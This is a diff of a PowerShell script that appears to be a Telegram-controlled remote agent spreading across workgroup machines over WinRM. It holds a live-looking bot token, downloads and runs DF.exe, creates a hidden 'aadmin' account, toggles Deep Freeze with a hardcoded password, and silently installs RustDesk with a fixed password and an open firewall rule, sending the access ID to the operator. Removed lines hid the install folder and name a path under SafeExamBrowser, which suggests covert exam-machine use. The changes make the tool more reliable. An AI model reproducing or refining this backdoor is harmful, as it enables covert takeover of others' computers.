@@ -3,7 +3,7 @@
 # - Local commands + WORKGROUP remote commands via hosts.txt
 # - /aadmin creates or enables the aadmin account
 # - /RemoveAadmin deletes it
-# - /InstallRust single-instance via mutex (no Start-Job)
+# - /InstallRust idempotent + mutex + hard timeout (no GUI, no install-loop)
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
@@ -13,7 +13,6 @@ $ProgressPreference    = 'SilentlyContinue'
 # ============================================================
 $BOT_TOKEN = '9176710386:AAEVMRpOI3UwYQG-bcerQ8b08nYehk58EOE'
 $CHAT_IDS  = @('6716357143','8546050060')
-
 $RemoteUser = 'Administrator'
 # ============================================================
 
@@ -25,7 +24,6 @@ $HostsFile  = Join-Path $DataDir 'hosts.txt'
 $CredFile   = Join-Path $DataDir 'cred.dat'
 $MutexName  = 'Global\WinSysDataSvcMutex'
 
-# ---------- single-instance ----------
 $createdNew = $false
 $mtx = New-Object System.Threading.Mutex($true, $MutexName, [ref]$createdNew)
 if (-not $createdNew) { exit }
@@ -43,17 +41,37 @@ function Send-Tg($chat, $text) {
     } catch {}
 }
 
-function Run-PS([string]$script) {
+# Hard-timeout child runner. No -Wait. Kills child + grandchildren on timeout.
+function Run-PS([string]$script, [int]$TimeoutSeconds = 60) {
     try {
         $tag = [guid]::NewGuid().ToString('N')
         $ps1 = Join-Path $env:TEMP "rp_$tag.ps1"
         $out = Join-Path $env:TEMP "rp_$tag.txt"
         $err = Join-Path $env:TEMP "rp_$tag.err"
         [IO.File]::WriteAllText($ps1, $script, (New-Object System.Text.UTF8Encoding($false)))
-        Start-Process -FilePath 'powershell.exe' `
+
+        $proc = Start-Process -FilePath 'powershell.exe' `
             -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$ps1`"") `
             -RedirectStandardOutput $out -RedirectStandardError $err `
-            -WindowStyle Hidden -Wait
+            -WindowStyle Hidden -PassThru
+
+        $waited = 0
+        while (-not $proc.HasExited -and $waited -lt $TimeoutSeconds) {
+            Start-Sleep -Milliseconds 500
+            $waited += 0.5
+        }
+
+        if (-not $proc.HasExited) {
+            try { & taskkill /F /T /PID $proc.Id 2>$null | Out-Null } catch {}
+            Start-Sleep -Milliseconds 500
+            $o1 = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
+            $o2 = if (Test-Path $err) { Get-Content $err -Raw } else { '' }
+            Remove-Item $ps1,$out,$err -Force -EA 0
+            $partial = ("$o1`n$o2").Trim()
+            if ($partial.Length -gt 3000) { $partial = $partial.Substring(0,3000) }
+            return ("TIMEOUT after ${TimeoutSeconds}s. Partial output:`n" + $(if ($partial) { $partial } else { '(none)' }))
+        }
+
         $o1 = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
         $o2 = if (Test-Path $err) { Get-Content $err -Raw } else { '' }
         Remove-Item $ps1,$out,$err -Force -EA 0
@@ -80,22 +98,19 @@ function Invoke-RemoteScript([string]$target, [string]$scriptText) {
     if ($target -ieq $env:COMPUTERNAME -or $target -ieq '127.0.0.1' -or $target -ieq 'localhost') {
         return (Run-PS $scriptText)
     }
-
-    $cred    = Get-Cred
+    $cred = Get-Cred
     $hasCred = [bool]$cred
-    $b64     = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
 
     $winrmUp = $false
     try { $winrmUp = [bool](Test-WSMan -ComputerName $target -ErrorAction Stop) } catch {}
-
     if (-not $winrmUp) {
         return "ERR: cannot reach WinRM on $target (host offline, WinRM disabled, or firewall blocks 5985/5986)"
     }
-
     $isDomain = $false
     try { $isDomain = [bool](Get-ADDomain -ErrorAction Stop) } catch {}
     if (-not $hasCred -and -not $isDomain) {
-        return "ERR: $target is WORKGROUP and no cred.dat exists. Add cred.dat or join a domain."
+        return "ERR: $target is WORKGROUP and no cred.dat exists."
     }
 
     $snippet = @"
@@ -124,26 +139,22 @@ function Get-LocalStatusReport {
     $now  = Get-Date
     $os   = Get-CimInstance Win32_OperatingSystem -EA 0
     $lastBoot = if ($os) { $os.LastBootUpTime } else { $now }
-    $uptime   = $now - $lastBoot
+    $uptime = $now - $lastBoot
     $ips = Get-NetIPAddress -AddressFamily IPv4 -EA 0 |
            Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
            Select-Object -ExpandProperty IPAddress -Unique
     $pub = 'n/a'; try { $pub = (Invoke-RestMethod 'https://api.ipify.org?format=json' -TimeoutSec 4).ip } catch {}
     $agentUp = 'n/a'
-    try {
-        if (Test-Path $StatusFile) {
-            $s = [datetime]::Parse((Get-Content $StatusFile -Raw).Trim())
-            $d = $now - $s
-            $agentUp = '{0}d {1}h {2}m' -f $d.Days, $d.Hours, $d.Minutes
-        }
-    } catch {}
+    try { if (Test-Path $StatusFile) {
+        $s = [datetime]::Parse((Get-Content $StatusFile -Raw).Trim()); $d = $now - $s
+        $agentUp = '{0}d {1}h {2}m' -f $d.Days, $d.Hours, $d.Minutes } } catch {}
     $dfc1 = 'C:\Windows\SysWOW64\DFC.exe'; $dfc2 = 'C:\Windows\System32\DFC.exe'
     $dfcState = if ((Test-Path $dfc1) -or (Test-Path $dfc2)) { 'present' } else { 'missing' }
     $rdSvc = (Get-Service rustdesk -EA 0).Status; if (-not $rdSvc) { $rdSvc = 'not installed' }
     $aa = 'absent'
     $u = Get-LocalUser 'aadmin' -EA 0
     if ($u) { $aa = if ($u.Enabled) { 'exists (enabled)' } else { 'exists (disabled)' } }
-    $lines = @(
+    @(
         "[ONLINE] $env:COMPUTERNAME",
         "User: $env:USERDOMAIN\$env:USERNAME",
         "OS: $($os.Caption) ($($os.Version))",
@@ -155,11 +166,10 @@ function Get-LocalStatusReport {
         "DFC: $dfcState",
         "aadmin: $aa",
         "Checked: $($now.ToString('yyyy-MM-dd HH:mm:ss'))"
-    )
-    return ($lines -join "`n")
+    ) -join "`n"
 }
 
-# ---------- payload scripts ----------
+# ---------- payloads ----------
 $ScriptInstallDF = '$url="https://github.com/asnake-wian/deploy/raw/refs/heads/main/DF.exe"; $out="$env:TEMP\DF.exe"; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; Start-Process -FilePath $out -ArgumentList "/Install" -Wait; Restart-Computer -Force'
 
 $ScriptCreateAadmin = @'
@@ -195,39 +205,82 @@ try {
 $ScriptThawed = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTTHAWED 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'
 $ScriptFrozen = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTFROZEN 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'
 
-# ---- /InstallRust : one payload, mutex-guarded, no Start-Job ----
+# ---- /InstallRust : idempotent + mutex + no GUI ----
 $ScriptInstallRust = @'
 try {
     $mtx = New-Object System.Threading.Mutex($false, 'Global\RustDesk_Install_Guard')
     if (-not $mtx.WaitOne(0, $false)) { return 'already running (another install in progress)' }
     try {
-        $exe = Join-Path $env:TEMP 'rd_installer.exe'
-        if (Test-Path $exe) { Remove-Item $exe -Force -EA 0 }
-        Invoke-WebRequest 'https://github.com/rustdesk/rustdesk/releases/download/1.3.7/rustdesk-1.3.7-x86_64.exe' `
-            -OutFile $exe -UseBasicParsing -TimeoutSec 120
-        if (-not (Test-Path $exe)) { return 'download failed' }
-        Start-Process $exe -ArgumentList '--silent-install','--install-service','--no-shortcut','--disable-printer' -Wait -EA 0
-        Remove-Item $exe -Force -EA 0
-        $rd = 'C:\Program Files\RustDesk\RustDesk.exe'
-        if (Test-Path $rd) {
-            $d = Split-Path $rd
-            attrib -h -s $d 2>$null
-            netsh advfirewall firewall add rule name=RustDeskSvc dir=in action=allow program="$rd" enable=yes profile=any 2>$null | Out-Null
-            sc.exe start rustdesk 2>$null | Out-Null
-            Start-Sleep 3
-            Start-Process $rd -ArgumentList '--password','Abel@123' -NoNewWindow -Wait -EA 0
+        $rd  = 'C:\Program Files\RustDesk\RustDesk.exe'
+        $cfg = 'C:\ProgramData\RustDesk\config\RustDesk2.toml'
+
+        # ---- idempotency: already installed with config -> just return ID ----
+        if ((Test-Path $rd) -and (Test-Path $cfg)) {
             $tmp = Join-Path $env:TEMP ("rid_" + [guid]::NewGuid().ToString('N') + '.txt')
             & $rd --get-id *> $tmp
             $id = (Get-Content $tmp -Raw -EA 0)
             Remove-Item $tmp -Force -EA 0
             $id = if ($id) { $id.Trim() } else { '' }
             if ($id -match '(\d{6,})') { $id = $matches[1] } else { $id = 'ID_NOT_FOUND' }
-            attrib +h +s $d 2>$null
-            return "IDF03: $id`nPW: Abel@123"
-        } else {
-            return 'installer completed but RustDesk.exe not found'
+            return "already installed -> IDF03: $id`nPW: Abel@123"
         }
-    } finally { $mtx.ReleaseMutex() }
+
+        # ---- kill any lingering RustDesk ----
+        taskkill /F /IM RustDesk.exe /T 2>$null | Out-Null
+        taskkill /F /IM rustdesk.exe /T 2>$null | Out-Null
+        Start-Sleep -Seconds 1
+
+        # ---- download installer ----
+        $exe = Join-Path $env:TEMP 'rd_installer.exe'
+        if (Test-Path $exe) { Remove-Item $exe -Force -EA 0 }
+        Invoke-WebRequest 'https://github.com/rustdesk/rustdesk/releases/download/1.3.7/rustdesk-1.3.7-x86_64.exe' `
+            -OutFile $exe -UseBasicParsing -TimeoutSec 120
+        if (-not (Test-Path $exe)) { return 'download failed' }
+
+        # ---- silent install WITH password (password goes to the INSTALLER) ----
+        $inst = Start-Process -FilePath $exe -ArgumentList @(
+            '--silent-install',
+            '--install-service',
+            '--no-shortcut',
+            '--disable-printer',
+            '--password', 'Abel@123'
+        ) -PassThru -WindowStyle Hidden
+
+        if (-not $inst.WaitForExit(120000)) {
+            try { taskkill /F /T /PID $inst.Id 2>$null | Out-Null } catch {}
+            return 'installer timed out after 120s'
+        }
+        if ($inst.ExitCode -ne 0) { return "installer exit code: $($inst.ExitCode)" }
+        Remove-Item $exe -Force -EA 0
+
+        # ---- remove shortcuts created by installer ----
+        $bad = @(
+            "$env:PUBLIC\Desktop\RustDesk.lnk",
+            "$env:PUBLIC\Desktop\RustDesk (1).lnk",
+            "$env:PUBLIC\Desktop\RustDesk Installer.lnk",
+            "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\RustDesk.lnk",
+            "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\RustDesk.lnk"
+        )
+        foreach ($p in $bad) { Remove-Item $p -Force -EA 0 }
+
+        # ---- firewall + service ----
+        if (-not (Test-Path $rd)) { return 'installer completed but RustDesk.exe not found' }
+        netsh advfirewall firewall delete rule name=RustDeskSvc 2>$null | Out-Null
+        netsh advfirewall firewall add rule name=RustDeskSvc dir=in action=allow program="$rd" enable=yes profile=any 2>$null | Out-Null
+        sc.exe start rustdesk 2>$null | Out-Null
+        Start-Sleep -Seconds 3
+
+        # ---- get ID headless (no GUI) ----
+        $tmp = Join-Path $env:TEMP ("rid_" + [guid]::NewGuid().ToString('N') + '.txt')
+        & $rd --get-id *> $tmp
+        $id = (Get-Content $tmp -Raw -EA 0)
+        Remove-Item $tmp -Force -EA 0
+        $id = if ($id) { $id.Trim() } else { '' }
+        if ($id -match '(\d{6,})') { $id = $matches[1] } else { $id = 'ID_NOT_FOUND' }
+
+        $pwSet = Test-Path $cfg
+        return ("IDF03: $id`nPW: Abel@123`nConfig: $(if($pwSet){'present'}else{'MISSING'})")
+    } finally { try { $mtx.ReleaseMutex() } catch {} }
 } catch { return "ERR: $_" }
 '@
 
@@ -244,7 +297,7 @@ try {
     )
     $u = $up | Where-Object { Test-Path $_ } | Select-Object -First 1
     if ($u) { Start-Process $u -ArgumentList '/S' -Wait -EA 0; 'uninstalled' }
-    else { 'uninstaller not found (probably not installed)' }
+    else { 'uninstaller not found' }
 } catch { "ERR: $_" }
 '@
 
@@ -257,28 +310,22 @@ try {
     $rp = @(
         'C:\Program Files\RustDesk\rustdesk.exe',
         'C:\Program Files (x86)\RustDesk\rustdesk.exe',
-        'C:\Program Files\SafeExamBrowser\Application\locales\RustDesk\rustdesk.exe',
         "$env:LOCALAPPDATA\RustDesk\rustdesk.exe"
     )
     $p = $null
     foreach ($x in $rp) { if (Test-Path $x) { $p = $x; break } }
     if (-not $p) { return 'RUSTDESK_NOT_FOUND' }
-    $d = Split-Path $p
-    attrib -h -s $d 2>$null
-    Start-Process $p -ArgumentList '--password','Abel@123' -NoNewWindow -Wait -EA 0
-    Start-Sleep 2
     $tmp = Join-Path $env:TEMP ("rid_" + [guid]::NewGuid().ToString('N') + '.txt')
     & $p --get-id *> $tmp
     $id = (Get-Content $tmp -Raw -EA 0)
     Remove-Item $tmp -Force -EA 0
     $id = if ($id) { $id.Trim() } else { '' }
     if ($id -match '(\d{6,})') { $id = $matches[1] } else { $id = 'ID_NOT_FOUND' }
-    attrib +h +s $d 2>$null
     return "IDF03: $id`nPW: Abel@123"
 } catch { return "ERR: $_" }
 '@
 
-# ---------- resolve targets ----------
+# ---------- targets ----------
 function Get-Targets {
     if (-not (Test-Path $HostsFile)) { return @() }
     Get-Content $HostsFile | ForEach-Object {
@@ -287,7 +334,7 @@ function Get-Targets {
     } | Where-Object { $_ -and ($_ -ine $env:COMPUTERNAME) }
 }
 
-# ---------- main loop ----------
+# ---------- main ----------
 $offset = Get-Off
 while ($true) {
     try {
@@ -301,73 +348,55 @@ while ($true) {
             $t = "$($u.message.text)".Trim()
             if (-not $t) { continue }
 
-            # /status [host]
             if ($t -match '^/status\b\s*(.*)$') {
                 $arg = $matches[1].Trim()
-                if (-not $arg -or $arg -ieq $env:COMPUTERNAME) {
-                    Send-Tg $cid (Get-LocalStatusReport)
-                } else {
+                if (-not $arg -or $arg -ieq $env:COMPUTERNAME) { Send-Tg $cid (Get-LocalStatusReport) }
+                else {
                     $r = Invoke-RemoteScript $arg 'try { $now=Get-Date; $os=Get-CimInstance Win32_OperatingSystem -EA 0; $ub=$os.LastBootUpTime; $up=$now-$ub; $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA 0|Where-Object{$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*"}|Select-Object -ExpandProperty IPAddress -Unique) -join ", "; "[ONLINE] $env:COMPUTERNAME`nUser: $env:USERDOMAIN\$env:USERNAME`nOS: $($os.Caption) ($($os.Version))`nUptime: {0}d {1}h {2}m`nLAN IP: $ips" -f $up.Days,$up.Hours,$up.Minutes } catch { "ERR: $_" }'
                     Send-Tg $cid ("STATUS -> $arg`n" + $r)
                 }
                 continue
             }
 
-            # /ID
-            if ($t -match '^/ID\b') {
-                Send-Tg $cid (Run-PS $ScriptID)
-                continue
-            }
+            if ($t -match '^/ID\b') { Send-Tg $cid (Run-PS $ScriptID); continue }
 
-            # /InstallDF [all|host|local]
             if ($t -match '^/InstallDF(?:\s+(.+))?$') {
                 $tg = if ($matches[1]) { $matches[1].Trim() } else { $env:COMPUTERNAME }
                 if ($tg -ieq 'all') {
                     $targets = Get-Targets
-                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries. Create $HostsFile."; continue }
+                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries."; continue }
                     $out = @("Local: " + (Run-PS $ScriptInstallDF))
                     foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptInstallDF) }
                     Send-Tg $cid ("InstallDF ALL`n" + ($out -join "`n"))
-                } else {
-                    Send-Tg $cid ("InstallDF -> $tg`n" + (Invoke-RemoteScript $tg $ScriptInstallDF))
-                }
+                } else { Send-Tg $cid ("InstallDF -> $tg`n" + (Invoke-RemoteScript $tg $ScriptInstallDF)) }
                 continue
             }
 
-            # /aadmin [all|host|local] - CREATE/ENABLE
             if ($t -match '^/aadmin(?:\s+(.+))?$') {
                 $tg = if ($matches[1]) { $matches[1].Trim() } else { $env:COMPUTERNAME }
                 if ($tg -ieq 'all') {
                     $targets = Get-Targets
-                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries. Create $HostsFile."; continue }
+                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries."; continue }
                     $out = @("Local: " + (Run-PS $ScriptCreateAadmin))
                     foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptCreateAadmin) }
                     Send-Tg $cid ("aadmin ALL`n" + ($out -join "`n"))
-                } else {
-                    Send-Tg $cid ("aadmin -> $tg`n" + (Invoke-RemoteScript $tg $ScriptCreateAadmin))
-                }
+                } else { Send-Tg $cid ("aadmin -> $tg`n" + (Invoke-RemoteScript $tg $ScriptCreateAadmin)) }
                 continue
             }
 
-            # /RemoveAadmin
-            if ($t -match '^/RemoveAadmin\b') {
-                Send-Tg $cid ("RemoveAadmin -> " + (Run-PS $ScriptRemoveAadmin))
-                continue
-            }
+            if ($t -match '^/RemoveAadmin\b') { Send-Tg $cid ("RemoveAadmin -> " + (Run-PS $ScriptRemoveAadmin)); continue }
+            if ($t -match '^/Thawed\b')       { Send-Tg $cid ("Thawed -> " + (Run-PS $ScriptThawed)); continue }
+            if ($t -match '^/Froozen\b')      { Send-Tg $cid ("Frozen -> " + (Run-PS $ScriptFrozen)); continue }
 
-            if ($t -match '^/Thawed\b') { Send-Tg $cid ("Thawed -> " + (Run-PS $ScriptThawed)); continue }
-            if ($t -match '^/Froozen\b') { Send-Tg $cid ("Frozen -> " + (Run-PS $ScriptFrozen)); continue }
-
-            # /InstallRust - single payload, mutex-guarded
             if ($t -match '^/InstallRust\b') {
                 Send-Tg $cid 'InstallRust started...'
-                Send-Tg $cid (Run-PS $ScriptInstallRust)
+                Send-Tg $cid (Run-PS $ScriptInstallRust -TimeoutSeconds 150)
                 continue
             }
 
             if ($t -match '^/UninstallRust\b') { Send-Tg $cid ("UninstallRust -> " + (Run-PS $ScriptUninstallRust)); continue }
-            if ($t -match '^/UninstallOld\b') { Run-PS $ScriptUninstallOld | Out-Null; Send-Tg $cid 'UninstallOld done.'; continue }
-            if ($t -match '^/Reset\b')        { Run-PS $ScriptReset        | Out-Null; Send-Tg $cid "Reset done on $env:COMPUTERNAME"; continue }
+            if ($t -match '^/UninstallOld\b')  { Run-PS $ScriptUninstallOld | Out-Null; Send-Tg $cid 'UninstallOld done.'; continue }
+            if ($t -match '^/Reset\b')         { Run-PS $ScriptReset        | Out-Null; Send-Tg $cid "Reset done on $env:COMPUTERNAME"; continue }
 
             Send-Tg $cid "Unknown: $t"
         }
